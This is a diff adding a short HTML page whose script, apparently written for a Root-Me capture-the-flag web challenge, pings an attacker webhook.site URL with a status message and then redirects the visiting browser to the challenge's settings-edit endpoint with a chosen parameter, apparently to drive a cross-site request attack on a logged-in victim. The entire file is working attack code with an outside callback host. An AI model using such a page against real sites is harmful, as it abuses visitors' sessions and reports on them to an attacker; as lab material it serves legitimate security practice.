@@ -1,0 +1,8 @@
+<!doctype html><meta charset=utf8><title>c</title><script>
+const WH='https://webhook.site/ca7d4ed4-7642-47ad-98ea-a6f1d402216f';
+const CH='http://challenge01.root-me.org:58010';
+const p=new URLSearchParams(location.search);
+const g=p.get('g'),d=+p.get('d')||800;
+fetch(WH+'?m='+encodeURIComponent('C armed '+g)+'&t='+Date.now()).catch(()=>{});
+setTimeout(()=>{location=CH+'/settings?edit='+g;},d);
+</script>
